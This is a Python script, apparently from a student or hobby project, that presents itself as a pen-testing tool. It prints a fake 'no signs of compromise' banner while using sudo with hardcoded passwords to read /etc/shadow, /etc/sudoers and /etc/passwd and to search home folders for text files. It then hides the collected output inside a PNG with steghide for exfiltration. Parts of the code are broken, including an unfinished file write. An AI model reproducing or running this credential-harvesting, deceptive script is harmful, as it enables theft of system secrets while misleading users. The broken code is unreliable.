# This is a python automation script meant for pen testing of ones own system. 
# This script will attempt to scan your computer for information, exfiltrate it,
# and then persist.

# This program will be made available through our Discord or Direct Message.
# Here we will explain how it works along with partial bits of code as demonstration.
# key - 4EA2A56396E4BB2C30897C1B8C090F54E8F2E1308780B8795E6B53A6E74FD814``
# iv - E69CCC163DA315AC46D66149421B2658

# Created by Hunter Schwager and Kyle McCarthy.

from carne import asada
import subprocess
import pexpect

# ------- QOL -------
export_section=''
section_header='-------------'
section_footer="-------------------------------------------\n"

# ------- Header -------

print("-------------Nat1 Configurations-------------")
print("The following system scan shows no signs of system degradation or compromise.")
print("-------------------------------------------\n")
# ------- Code -------

def sudo_command(command, report):

    if report==True:
        sudo_access = pexpect.spawn(command + '>> API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf')
    else:
        sudo_access = pexpect.spawn(command)
    
    sudo_access.expect('for', timeout=1000)
    sudo_access.sendline('password')
    sudo_access.expect(pexpect.EOF)
    sudo_access.sendline('hamiscool')
    output = sudo_access.before.decode('utf-8')

    return output
       
def steg_command(command):

    sudo_access = pexpect.spawn(command)
    sudo_access.expect('for', timeout=1000)
    sudo_access.sendline('password')
    sudo_access.expect(pexpect.EOF)
    sudo_access.sendline('carneasaderecipe')
    output = sudo_access.before.decode('utf-8')

    return output

class SkillCheck:
    command_input = []

    def __init__(self, name):
        self.name= name

    def proficiency(self, ability_score):
            print("\n", section_header + self.name + section_header)
            self = subprocess.run(ability_score.split())
            print(section_footer)
            return self

    def inspiration(input, ability_score, report):
        sudo_command(ability_score, report)

    def investigation(self, directory, search, report):
        print("\n", section_header + self.name + section_header)
        command = 'sudo find ' + directory + ' -type f -iname ' + search
        files_to_search = sudo_command(command, report)
        print(files_to_search)

def basicScan():

# ------- Inspiration -------

    etcshadow_bot = SkillCheck("Home Directory Health")
    etcshadow_bot.inspiration('sudo cat /etc/shadow', True)

    poncho_bot = SkillCheck("Privilege Audit")
    poncho_bot.inspiration('sudo cat /etc/sudoers', True)

# ------- Investigation -------

    cron_bot = SkillCheck("Home Folder | .txt")
    cron_bot.investigation('/home/', '*.txt', True) 

# ------- Proficiency -------

    ip_addr_bot = SkillCheck("IP")
    ip_addr_bot.proficiency('ip addr')

    online_users_bot = SkillCheck("Online Users")
    online_users_bot.proficiency('who')

    passwd_bot = SkillCheck("/etc/passwd")
    passwd_bot.proficiency('cat /etc/passwd')

    host_bot = SkillCheck("Host System")
    host_bot.proficiency('uname -a')

    group_bot = SkillCheck("Groups")
    group_bot.proficiency("cat /etc/group")

# ------- Misc -------

def secret_ingredient():
    stomach_bot = SkillCheck("Secret Recipe")
    stomach_bot.proficiency('echo', asada)

    steg_command('steghide embed -cf steg.png -ef API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf')

# ------- Exfiltration -------

def i_am_a_stegosaurus():
    steg_command('sudo apt install steghide')

    secret_ingredient()
    steg_command('steghide embed -cf steg.png -ef API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf')
    

def secret_recipe(asada):
    
    with open('secret_recipe.txt', 'x') as file:
        file.write(

)
# ------- Execution -------

def __main__():
    basicScan()
    i_am_a_stegosaurus()


if __name__ == '__main__':
    __main__()